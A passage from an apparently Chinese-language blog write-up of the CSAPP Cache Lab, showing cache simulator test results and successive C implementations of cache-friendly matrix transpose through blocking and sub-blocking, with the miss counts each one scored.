class="line"><span class="comment">// output the result and release memories</span></span><br><span class="line">fclose(fp);</span><br><span class="line"><span class="built_in">free</span>(cache);</span><br><span class="line">printSummary(hits, misses, evictions);</span><br></pre></td></tr></table></figure></p><p>测试结果如下：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@Andrew:/mnt/d/.c/csapp/cachelab-handout# ./test-csim</span><br><span class="line">                        Your simulator     Reference simulator</span><br><span class="line">Points (s,E,b)    Hits  Misses  Evicts    Hits  Misses  Evicts</span><br><span class="line">     3 (1,1,1)       9       8       6       9       8       6  traces/yi2.trace</span><br><span class="line">     3 (4,2,4)       4       5       2       4       5       2  traces/yi.trace</span><br><span class="line">     3 (2,1,4)       2       3       1       2       3       1  traces/dave.trace</span><br><span class="line">     3 (2,1,3)     167      71      67     167      71      67  traces/trans.trace</span><br><span class="line">     3 (2,2,3)     201      37      29     201      37      29  traces/trans.trace</span><br><span class="line">     3 (2,4,3)     212      26      10     212      26      10  traces/trans.trace</span><br><span class="line">     3 (5,1,5)     231       7       0     231       7       0  traces/trans.trace</span><br><span class="line">     6 (5,1,5)  265189   21775   21743  265189   21775   21743  traces/long.trace</span><br><span class="line">    27</span><br><span class="line"></span><br><span class="line">TEST_CSIM_RESULTS=27</span><br></pre></td></tr></table></figure></p><hr><h1 id="Part-B-优化矩阵转置"><a href="#Part-B-优化矩阵转置" class="headerlink" title="Part B: 优化矩阵转置"></a>Part B: 优化矩阵转置</h1><h2 id="1-实验目标-1"><a href="#1-实验目标-1" class="headerlink" title="1. 实验目标"></a>1. 实验目标</h2><p>实验提供了验证矩阵转置函数的正确性及其表现的打分器，将编写的函数在缓存参数为</p><script type="math/tex; mode=display">s = 5, E = 1, b = 5</script><p>的条件下运行，并跟踪hit，miss和eviction的次数。一共有三个关卡：</p><ol><li>对$32 \times 32$的矩阵作转置，$miss &lt; 300$满分，$miss &gt; 600$零分</li><li>对$64 \times 64$的矩阵作转置，$miss &lt; 1300$满分，$miss &gt; 2000$零分</li><li>对$61 \times 67$的矩阵作转置，$miss &lt; 2000$满分，$miss &gt; 3000$零分</li></ol><h2 id="2-实验过程"><a href="#2-实验过程" class="headerlink" title="2. 实验过程"></a>2. 实验过程</h2><blockquote><p>实验环境有点小坑：</p><ol><li>test-trans运行超时：将实验文件夹从共享文件夹中移动到Linux单独的目录中</li><li>移动后Permission Denied：使用命令chmod 777 xx(文件名称)</li></ol></blockquote><p>实话说要自己想出来优化方法真的很难，本人做个分块之后就手足无措了，然后搜刮资料看别人的优秀思路，听取妙声一片（</p><h3 id="1-32-times-32"><a href="#1-32-times-32" class="headerlink" title="(1) 32 $\times$ 32"></a>(1) 32 $\times$ 32</h3><p>由于$b = 5$，那么$B = 2^b = 32$，缓存中每一行保存32字节的数据，又int占4个字节，那么缓存中<strong>每一行能存8个int</strong></p><p>由于$s = 5$且$E = 1$，那么共有$S = 2^s = 32$组，每一组只有一行，故<strong>缓存总共能存32 * 8 个int</strong></p><p>本例中，处理的矩阵是32 $\times$ 32，故缓存<strong>最多能保存矩阵的8行</strong></p><p>那正好，按<strong>8 * 8分块</strong>的话，8列能完美地利用每一行缓存中的8个int，8行又恰好保证了每一行有不同的set index，不会互相冲突。</p><p>分块写法如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> trans_blocking_decr[] = <span class="string">&quot;blocking 8 by 8&quot;</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">trans_blocking</span><span class="params">(<span class="type">int</span> M, <span class="type">int</span> N, <span class="type">int</span> A[N][M], <span class="type">int</span> B[M][N])</span>&#123;</span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line">    <span class="type">int</span> k, t;</span><br><span class="line">    <span class="type">int</span> size = <span class="number">8</span>;</span><br><span class="line">    <span class="type">int</span> maxI = N / size, maxJ = M / size;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; maxI; ++i)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; maxJ; ++j)&#123;</span><br><span class="line">            <span class="type">int</span> minK = i * size, maxK = (i + <span class="number">1</span>) * size;</span><br><span class="line">            <span class="type">int</span> minT = j * size, maxT = (j + <span class="number">1</span>) * size;</span><br><span class="line">            <span class="keyword">for</span>(k = minK; k &lt; N &amp;&amp; k &lt; maxK; ++k)&#123;</span><br><span class="line">                <span class="keyword">for</span>(t = minT; t &lt; M &amp;&amp; t &lt; maxT; ++t)&#123;</span><br><span class="line">                    B[t][k] = A[k][t];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>测试结果如下：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Function 2 (3 total)</span><br><span class="line">Step 1: Validating and generating memory traces</span><br><span class="line">Step 2: Evaluating performance (s=5, E=1, b=5)</span><br><span class="line">func 2 (blocking 8 by 8): hits:1709, misses:344, evictions:312</span><br></pre></td></tr></table></figure><br>仍然有344次miss，这是怎么回事呢？</p><p>对分块进行理论值分析：块长宽为8，矩阵长宽为32，那么A和B各有(32 / 8) ^ 2 = 16块，每一块有八分之一miss，也就是 8 <em> 8 </em> (1 / 8) = 8 下miss。综上，应该总共有 2 <em> 16 </em> 8 = <strong>256次miss</strong>才对。344比理论多了不少。</p><p>原来是因为，定义M和N这两个数组的代码在tracegen.c中，长这样：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> A[<span class="number">256</span>][<span class="number">256</span>];</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> B[<span class="number">256</span>][<span class="number">256</span>];</span><br></pre></td></tr></table></figure><br>这说明，A和B都是连续的256 <em> 256个int，是缓存容量的整数倍。因此，取A和B中下标相同的位置时，它们的地址总是相差256 </em> 256个int的长度，地址会被分割为tag，set index和block offset。故它们的<strong>set index相同但tag不同</strong>，而一个组只有一行，需要eviction。</p><p>这么一来，对于<strong>对角线上的块</strong>，就会反复地出现miss 和 eviction，需要对其特殊处理。</p><p><del>这怎么想得到（小声</del></p><p>特殊处理就是，遍历位于A中的块的每一行时，把一整行用局部变量存到寄存器中，就不怕写入B导致的eviction会让下一次读A出现miss了。也就是通过保存A，<strong>减少冲突情况下读取A导致的miss</strong></p><p>改进写法如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">trans_blocking</span><span class="params">(<span class="type">int</span> M, <span class="type">int</span> N, <span class="type">int</span> A[N][M], <span class="type">int</span> B[M][N])</span>&#123;</span><br><span class="line">    <span class="type">int</span> i, j, k, t;</span><br><span class="line">    <span class="type">int</span> a0, a1, a2, a3, a4, a5, a6, a7;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; N; i += <span class="number">8</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; M; j += <span class="number">8</span>)&#123;    </span><br><span class="line">            <span class="keyword">if</span>(i == j)&#123;</span><br><span class="line">                <span class="keyword">for</span>(k = i; k &lt; i + <span class="number">8</span>; ++k)&#123;</span><br><span class="line">                    a0 = A[k][j];</span><br><span class="line">                    a1 = A[k][j + <span class="number">1</span>];</span><br><span class="line">                    a2 = A[k][j + <span class="number">2</span>];</span><br><span class="line">                    a3 = A[k][j + <span class="number">3</span>];</span><br><span class="line">                    a4 = A[k][j + <span class="number">4</span>];</span><br><span class="line">                    a5 = A[k][j + <span class="number">5</span>];</span><br><span class="line">                    a6 = A[k][j + <span class="number">6</span>];</span><br><span class="line">                    a7 = A[k][j + <span class="number">7</span>];</span><br><span class="line">                    B[j][k] = a0;</span><br><span class="line">                    B[j + <span class="number">1</span>][k] = a1;</span><br><span class="line">                    B[j + <span class="number">2</span>][k] = a2;</span><br><span class="line">                    B[j + <span class="number">3</span>][k] = a3;</span><br><span class="line">                    B[j + <span class="number">4</span>][k] = a4;</span><br><span class="line">                    B[j + <span class="number">5</span>][k] = a5;</span><br><span class="line">                    B[j + <span class="number">6</span>][k] = a6;</span><br><span class="line">                    B[j + <span class="number">7</span>][k] = a7;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">for</span>(k = i; k &lt; i + <span class="number">8</span>; ++k)</span><br><span class="line">                    <span class="keyword">for</span>(t = j; t &lt; j + <span class="number">8</span>; ++t)</span><br><span class="line">                        B[t][k] = A[k][t];     </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="comment">// for j</span></span><br><span class="line">    &#125;<span class="comment">// for i</span></span><br><span class="line">&#125;<span class="comment">// trans_blocking</span></span><br></pre></td></tr></table></figure><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Function 2 (3 total)</span><br><span class="line">Step 1: Validating and generating memory traces</span><br><span class="line">Step 2: Evaluating performance (s=5, E=1, b=5)</span><br><span class="line">func 2 (blocking 8 by 8): hits:1765, misses:288, evictions:256</span><br></pre></td></tr></table></figure><br>漂亮的很馁，结果是288次miss。</p><p>其实还可以再改进，我们看到前面减少的是读取A时的miss，其实还可以<strong>减少写入B时的miss</strong>。由于对于A是行操作，对于B是列操作（需要8行缓存），当两者交错在一起时，必然会导致每次对A的读取都会使下一次对B的写入多一次miss。所以引申出新思路（太nb了）：先<strong>按行读A</strong>，并<strong>按行写入到B对应块</strong>中，再对<strong>B中每一块作转置</strong></p><p>代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">trans_blocking_advanced</span><span class="params">(<span class="type">int</span> M, <span class="type">int</span> N, <span class="type">int</span> A[N][M], <span class="type">int</span> B[M][N])</span>&#123;</span><br><span class="line">    <span class="type">int</span> i, j, k, t;</span><br><span class="line">    <span class="type">int</span> a0, a1, a2, a3, a4, a5, a6, a7;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; N; i += <span class="number">8</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; M; j += <span class="number">8</span>)&#123;</span><br><span class="line">            <span class="comment">// 将A中每一块按行复制到B中对应块</span></span><br><span class="line">            <span class="comment">// A 是从 i, j 开始递增</span></span><br><span class="line">            <span class="comment">// 那么B是从 j, i 开始递增</span></span><br><span class="line">             <span class="keyword">for</span>(k = i, t = j; k &lt; i + <span class="number">8</span>; ++k, ++t)&#123;</span><br><span class="line">                a0 = A[k][j];</span><br><span class="line">                a1 = A[k][j + <span class="number">1</span>];</span><br><span class="line">                a2 = A[k][j + <span class="number">2</span>];</span><br><span class="line">                a3 = A[k][j + <span class="number">3</span>];</span><br><span class="line">                a4 = A[k][j + <span class="number">4</span>];</span><br><span class="line">                a5 = A[k][j + <span class="number">5</span>];</span><br><span class="line">                a6 = A[k][j + <span class="number">6</span>];</span><br><span class="line">                a7 = A[k][j + <span class="number">7</span>];</span><br><span class="line">                B[t][i] = a0;</span><br><span class="line">                B[t][i + <span class="number">1</span>] = a1;</span><br><span class="line">                B[t][i + <span class="number">2</span>] = a2;</span><br><span class="line">                B[t][i + <span class="number">3</span>] = a3;</span><br><span class="line">                B[t][i + <span class="number">4</span>] = a4;</span><br><span class="line">                B[t][i + <span class="number">5</span>] = a5;</span><br><span class="line">                B[t][i + <span class="number">6</span>] = a6;</span><br><span class="line">                B[t][i + <span class="number">7</span>] = a7;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 对每一块内作转置</span></span><br><span class="line">            <span class="comment">// 注意B的块是在 j, i 到 j + 8, i + 8 之间</span></span><br><span class="line">            <span class="keyword">for</span>(k = <span class="number">0</span>; k &lt; <span class="number">8</span>; ++k)&#123;</span><br><span class="line">                <span class="keyword">for</span>(t = k + <span class="number">1</span>; t &lt; <span class="number">8</span>; ++t)&#123;</span><br><span class="line">                    a0 = B[j + k][i + t];</span><br><span class="line">                    B[j + k][i + t] = B[j + t][i + k];</span><br><span class="line">                    B[j + t][i + k] = a0;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="comment">// for j</span></span><br><span class="line">    &#125;<span class="comment">// for i</span></span><br><span class="line">&#125;<span class="comment">// trans_blocking_advanced</span></span><br></pre></td></tr></table></figure><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Function 3 (4 total)</span><br><span class="line">Step 1: Validating and generating memory traces</span><br><span class="line">Step 2: Evaluating performance (s=5, E=1, b=5)</span><br><span class="line">func 3 (advanced version of blocking 8 by 8): hits:3585, misses:260, evictions:228</span><br></pre></td></tr></table></figure><br>太美丽辣，misses低至260！！！只比理论值高出4点</p><h3 id="2-64-times-64"><a href="#2-64-times-64" class="headerlink" title="(2) 64 $\times$ 64"></a>(2) 64 $\times$ 64</h3><p>前面说到，缓存能保存32 <em> 8 个int，也就是32 </em> 32的int矩阵的8行。也就是说，每过8行，set index就会重新计数。由于前面取的是8 * 8的块，所以块内不会出现set index冲突的情况。</p><p>而现在，矩阵的规格是64 <em> 64，也就是说，每过4行，set index就会重新计数。如果取8 </em> 8的块，那么块内<strong>前4行跟后4行的set index就会出现冲突</strong>！</p><p>但是为了充分利用缓存又不得不用8 <em> 8的块，因此聪明的大佬们就想到了**把8 </em> 8的块再分成4个4 <em> 4的块*</em>再处理</p><p>先展示一下本人失败的思路：</p><p>先跟32 <em> 32一样，把每个块按行复制到B中，再在B中把每个块分成4 </em> 4的块做转置：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">trans_blocking_pp</span><span class="params">(<span class="type">int</span> M, <span class="type">int</span> N, <span class="type">int</span> A[N][M], <span class="type">int</span> B[M][N])</span>&#123;</span><br><span class="line">    <span class="type">int</span> i, j, k, t;</span><br><span class="line">    <span class="type">int</span> a0, a1, a2, a3, a4, a5, a6, a7;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; N; i += <span class="number">8</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; M; j += <span class="number">8</span>)&#123;</span><br><span class="line">            <span class="comment">// 同32*32, 从A按行复制到B</span></span><br><span class="line">            <span class="keyword">for</span>(k = i, t = j; k &lt; i + <span class="number">8</span>; ++k, ++t)&#123;</span><br><span class="line">                a0 = A[k][j];</span><br><span class="line">                a1 = A[k][j + <span class="number">1</span>];</span><br><span class="line">                a2 = A[k][j + <span class="number">2</span>];</span><br><span class="line">                a3 = A[k][j + <span class="number">3</span>];</span><br><span class="line">                a4 = A[k][j + <span class="number">4</span>];</span><br><span class="line">                a5 = A[k][j + <span class="number">5</span>];</span><br><span class="line">                a6 = A[k][j + <span class="number">6</span>];</span><br><span class="line">                a7 = A[k][j + <span class="number">7</span>];</span><br><span class="line">                B[t][i] = a0;</span><br><span class="line">                B[t][i + <span class="number">1</span>] = a1;</span><br><span class="line">                B[t][i + <span class="number">2</span>] = a2;</span><br><span class="line">                B[t][i + <span class="number">3</span>] = a3;</span><br><span class="line">                B[t][i + <span class="number">4</span>] = a4;</span><br><span class="line">                B[t][i + <span class="number">5</span>] = a5;</span><br><span class="line">                B[t][i + <span class="number">6</span>] = a6;</span><br><span class="line">                B[t][i + <span class="number">7</span>] = a7;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 对4个 4 * 4的块做转置</span></span><br><span class="line">            <span class="comment">// 右上和左下对换 </span></span><br><span class="line">            <span class="comment">// 右上从 j, i + 4 开始数</span></span><br><span class="line">            <span class="comment">// 左下从 j + 4, i 开始数</span></span><br><span class="line">            <span class="keyword">for</span>(k = <span class="number">0</span>; k &lt; <span class="number">4</span>; ++k)&#123;</span><br><span class="line">                a0 = B[j + k][i + <span class="number">4</span>];</span><br><span class="line">                a1 = B[j + k][i + <span class="number">5</span>];</span><br><span class="line">                a2 = B[j + k][i + <span class="number">6</span>];</span><br><span class="line">                a3 = B[j + k][i + <span class="number">7</span>];</span><br><span class="line">                B[j + k][i + <span class="number">4</span>] = B[j + <span class="number">4</span> + k][i];</span><br><span class="line">                B[j + k][i + <span class="number">5</span>] = B[j + <span class="number">4</span> + k][i + <span class="number">1</span>];</span><br><span class="line">                B[j + k][i + <span class="number">6</span>] = B[j + <span class="number">4</span> + k][i + <span class="number">2</span>];</span><br><span class="line">                B[j + k][i + <span class="number">7</span>] = B[j + <span class="number">4</span> + k][i + <span class="number">3</span>];</span><br><span class="line">                B[j + <span class="number">4</span> + k][i] = a0;</span><br><span class="line">                B[j + <span class="number">4</span> + k][i + <span class="number">1</span>] = a1;</span><br><span class="line">                B[j + <span class="number">4</span> + k][i + <span class="number">2</span>] = a2;</span><br><span class="line">                B[j + <span class="number">4</span> + k][i + <span class="number">3</span>] = a3;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 再对四个4 * 4矩阵各自转置</span></span><br><span class="line">            <span class="comment">// 左上然后右上, 左下然后右下 能充分利用缓存</span></span><br><span class="line">            <span class="keyword">for</span>(k = <span class="number">0</span>; k &lt; <span class="number">4</span>; ++k)&#123;</span><br><span class="line">                <span class="keyword">for</span>(t = k + <span class="number">1</span>; t &lt; <span class="number">4</span>; ++t)&#123;</span><br><span class="line">                    a0 = B[j + k][i + t];</span><br><span class="line">                    B[j + k][i + t] = B[j + t][i + k];</span><br><span class="line">                    B[j + t][i + k] = a0;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 右上</span></span><br><span class="line">            <span class="keyword">for</span>(k = <span class="number">0</span>; k &lt; <span class="number">4</span>; ++k)&#123;</span><br><span class="line">                <span class="keyword">for</span>(t = k + <span class="number">1</span>; t &lt; <span class="number">4</span>; ++t)&#123;</span><br><span class="line">                    a0 = B[j + k][i + <span class="number">4</span> + t];</span><br><span class="line">                    B[j + k][i + <span class="number">4</span> + t] = B[j + t][i + <span class="number">4</span> + k];</span><br><span class="line">                    B[j + t][i + <span class="number">4</span> + k] = a0;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 左下</span></span><br><span class="line">            <span class="keyword">for</span>(k = <span class="number">0</span>; k &lt; <span class="number">4</span>; ++k)&#123;</span><br><span class="line">                <span class="keyword">for</span>(t = k + <span class="number">1</span>; t &lt; <span class="number">4</span>; ++t)&#123;</span><br><span class="line">                    a0 = B[j + <span class="number">4</span> + k][i + t];</span><br><span class="line">                    B[j + <span class="number">4</span> + k][i + t] = B[j + <span class="number">4</span> + t][i + k];</span><br><span class="line">                    B[j + <span class="number">4</span> + t][i + k] = a0;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 右下</span></span><br><span class="line">            <span class="keyword">for</span>(k = <span class="number">0</span>; k &lt; <span class="number">4</span>; ++k)&#123;</span><br><span class="line">                <span class="keyword">for</span>(t = k + <span class="number">1</span>; t &lt; <span class="number">4</span>; ++t)&#123;</span><br><span class="line">                    a0 = B[j + <span class="number">4</span> + k][i + <span class="number">4</span> + t];</span><br><span class="line">                    B[j + <span class="number">4</span> + k][i + <span class="number">4</span> + t] = B[j + <span class="number">4</span> + t][i + <span class="number">4</span> + k];</span><br><span class="line">                    B[j + <span class="number">4</span> + t][i + <span class="number">4</span> + k] = a0;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="comment">// for j</span></span><br><span class="line">    &#125;<span class="comment">// for i</span></span><br><span class="line">&#125;<span class="comment">// trans_blocking_pp</span></span><br></pre></td></tr></table></figure><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Function 2 (3 total)</span><br><span class="line">Step 1: Validating and generating memory traces</span><br><span class="line">Step 2: Evaluating performance (s=5, E=1, b=5)</span><br><span class="line">func 2 (plus plus version of blocking trans): hits:14337, misses:4100, evictions:4068</span><br></pre></td></tr></table></figure><br>结果不尽人意，分析是因为完整地复制了8行过去，B的后4行的缓存会覆盖B的前4行，这时再做转置会反复miss。</p><p>于是尝试<strong>先复制前4行</strong>过去，<strong>转置</strong>。然后别着急，先别把后4行复制过去，全部在B中就不好处理了。想想现在缓存里是什么：A的前4行 和 B的前4行。<br>其中B的前4行的后4列（右上）是需要移动的，移动后是A的后4行前4列来补充（左下），所以趁着B的前4行缓存还在，赶紧把这个操作完成了。<strong>局部变量按行存B的右上</strong>，然后<strong>按列取出A的左下转置到B的右上空出的那一行</strong>，再<strong>把保存的那一行转移到B的左下</strong></p><p>这时，B的前4行已经完全不在缓存中了，只要放心地把<strong>B的右下等于A的右下的转置</strong>就行了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">trans_blocking_pp</span><span class="params">(<span class="type">int</span> M, <span class="type">int</span> N, <span class="type">int</span> A[N][M], <span class="type">int</span> B[M][N])</span>&#123;</span><br><span class="line">    <span class="type">int</span> i, j, k, t;</span><br><span class="line">    <span class="type">int</span> a0, a1, a2, a3, a4, a5, a6, a7;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; N; i += <span class="number">8</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; M; j += <span class="number">8</span>)&#123;</span><br><span class="line">            <span class="comment">// 同32*32, 从A按行复制到B</span></span><br><span class="line">            <span class="keyword">for</span>(k = i, t = j; k &lt; i + <span class="number">4</span>; ++k, ++t)&#123;</span><br><span class="line">                a0 = A[k][j];</span><br><span class="line">                a1 = A[k][j + <span class="number">1</span>];</span><br><span class="line">                a2 = A[k][j + <span class="number">2</span>];</span><br><span class="line">                a3 = A[k][j + <span class="number">3</span>];</span><br><span class="line">                a4 = A[k][j + <span class="number">4</span>];</span><br><span class="line">                a5 = A[k][j + <span class="number">5</span>];</span><br><span class="line">                a6 = A[k][j + <span class="number">6</span>];</span><br><span class="line">                a7 = A[k][j + <span class="number">7</span>];</span><br><span class="line">                B[t][i] = a0;</span><br><span class="line">                B[t][i + <span class="number">1</span>] = a1;</span><br><span class="line">                B[t][i + <span class="number">2</span>] = a2;</span><br><span class="line">                B[t][i + <span class="number">3</span>] = a3;</span><br><span class="line">                B[t][i + <span class="number">4</span>] = a4;</span><br><span class="line">                B[t][i + <span class="number">5</span>] = a5;</span><br><span class="line">                B[t][i + <span class="number">6</span>] = a6;</span><br><span class="line">                B[t][i + <span class="number">7</span>] = a7;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 左上</span></span><br><span class="line">            <span class="keyword">for</span>(k = <span class="number">0</span>; k &lt; <span class="number">4</span>; ++k)&#123;</span><br><span class="line">                <span class="keyword">for</span>(t = k + <span class="number">1</span>; t &lt; <span class="number">4</span>; ++t)&#123;</span><br><span class="line">                    a0 = B[j + k][i + t];</span><br><span class="line">                    B[j + k][i + t] = B[j + t][i + k];</span><br><span class="line">                    B[j + t][i + k] = a0;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 右上</span></span><br><span class="line">            <span class="keyword">for</span>(k = <span class="number">0</span>; k &lt; <span class="number">4</span>; ++k)&#123;</span><br><span class="line">                <span class="keyword">for</span>(t = k + <span class="number">1</span>; t &lt; <span class="number">4</span>; ++t)&#123;</span><br><span class="line">                    a0 = B[j + k][i + <span class="number">4</span> + t];</span><br><span class="line">                    B[j + k][i + <span class="number">4</span> + t] = B[j + t][i + <span class="number">4</span> + k];</span><br><span class="line">                    B[j + t][i + <span class="number">4</span> + k] = a0;</span><br><span class="line">                &#125;</span><br><span 